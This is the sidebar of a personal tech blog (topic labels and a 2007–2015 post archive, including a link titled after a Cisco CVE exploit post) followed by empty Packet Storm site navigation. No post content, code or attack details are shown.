[openvpn](https://wadofstuff.blogspot.com/search/label/openvpn)
(1)

[perl](https://wadofstuff.blogspot.com/search/label/perl)
(1)

[programming](https://wadofstuff.blogspot.com/search/label/programming)
(9)

[python](https://wadofstuff.blogspot.com/search/label/python)
(14)

[ruby](https://wadofstuff.blogspot.com/search/label/ruby)
(1)

[security](https://wadofstuff.blogspot.com/search/label/security)
(3)

[serializer](https://wadofstuff.blogspot.com/search/label/serializer)
(4)

[servicetags](https://wadofstuff.blogspot.com/search/label/servicetags)
(2)

[smf](https://wadofstuff.blogspot.com/search/label/smf)
(6)

[solaris](https://wadofstuff.blogspot.com/search/label/solaris)
(31)

[splunk](https://wadofstuff.blogspot.com/search/label/splunk)
(4)

[sst jass](https://wadofstuff.blogspot.com/search/label/sst%20jass)
(1)

[testing](https://wadofstuff.blogspot.com/search/label/testing)
(1)

[zfs](https://wadofstuff.blogspot.com/search/label/zfs)
(3)

## Blog Archive

* ▼
  [2015](https://wadofstuff.blogspot.com/2015/)
  (2)
  + ▼
    [November](https://wadofstuff.blogspot.com/2015/11/)
    (1)
    - [CVE-2015-6357: FirePWNER Exploit for Cisco FireSIG...](https://wadofstuff.blogspot.com/2015/11/cve-2015-6357-firepwner-exploit-for.html)
  + ►
    [April](https://wadofstuff.blogspot.com/2015/04/)
    (1)

* ►
  [2012](https://wadofstuff.blogspot.com/2012/)
  (1)
  + ►
    [March](https://wadofstuff.blogspot.com/2012/03/)
    (1)

* ►
  [2011](https://wadofstuff.blogspot.com/2011/)
  (4)
  + ►
    [August](https://wadofstuff.blogspot.com/2011/08/)
    (1)
  + ►
    [July](https://wadofstuff.blogspot.com/2011/07/)
    (1)
  + ►
    [June](https://wadofstuff.blogspot.com/2011/06/)
    (1)
  + ►
    [February](https://wadofstuff.blogspot.com/2011/02/)
    (1)

* ►
  [2010](https://wadofstuff.blogspot.com/2010/)
  (4)
  + ►
    [December](https://wadofstuff.blogspot.com/2010/12/)
    (1)
  + ►
    [November](https://wadofstuff.blogspot.com/2010/11/)
    (1)
  + ►
    [September](https://wadofstuff.blogspot.com/2010/09/)
    (2)

* ►
  [2009](https://wadofstuff.blogspot.com/2009/)
  (18)
  + ►
    [November](https://wadofstuff.blogspot.com/2009/11/)
    (2)
  + ►
    [October](https://wadofstuff.blogspot.com/2009/10/)
    (2)
  + ►
    [August](https://wadofstuff.blogspot.com/2009/08/)
    (2)
  + ►
    [July](https://wadofstuff.blogspot.com/2009/07/)
    (4)
  + ►
    [May](https://wadofstuff.blogspot.com/2009/05/)
    (3)
  + ►
    [April](https://wadofstuff.blogspot.com/2009/04/)
    (1)
  + ►
    [March](https://wadofstuff.blogspot.com/2009/03/)
    (1)
  + ►
    [February](https://wadofstuff.blogspot.com/2009/02/)
    (3)

* ►
  [2008](https://wadofstuff.blogspot.com/2008/)
  (8)
  + ►
    [September](https://wadofstuff.blogspot.com/2008/09/)
    (1)
  + ►
    [June](https://wadofstuff.blogspot.com/2008/06/)
    (2)
  + ►
    [April](https://wadofstuff.blogspot.com/2008/04/)
    (3)
  + ►
    [March](https://wadofstuff.blogspot.com/2008/03/)
    (1)
  + ►
    [February](https://wadofstuff.blogspot.com/2008/02/)
    (1)

* ►
  [2007](https://wadofstuff.blogspot.com/2007/)
  (20)
  + ►
    [November](https://wadofstuff.blogspot.com/2007/11/)
    (2)
  + ►
    [October](https://wadofstuff.blogspot.com/2007/10/)
    (1)
  + ►
    [September](https://wadofstuff.blogspot.com/2007/09/)
    (2)
  + ►
    [August](https://wadofstuff.blogspot.com/2007/08/)
    (2)
  + ►
    [May](https://wadofstuff.blogspot.com/2007/05/)
    (2)
  + ►
    [March](https://wadofstuff.blogspot.com/2007/03/)
    (5)
  + ►
    [February](https://wadofstuff.blogspot.com/2007/02/)
    (4)
  + ►
    [January](https://wadofstuff.blogspot.com/2007/01/)
    (2)

## Projects

* [Wad of Stuff code repository](https://github.com/mattimustang/wadofstuff)
* [iPhoto Keyword Utilities](https://github.com/mattimustang/iphotokeywordutilities)

|  |  |
| --- | --- |

Travel theme. Theme images by [sandsun](http://www.istockphoto.com/googleimages.php?id=7944350&platform=blogger&langregion=en_GB). Powered by [Blogger](https://www.blogger.com).



=== Content from packetstormsecurity.com_23e518ca_20250125_072852.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)


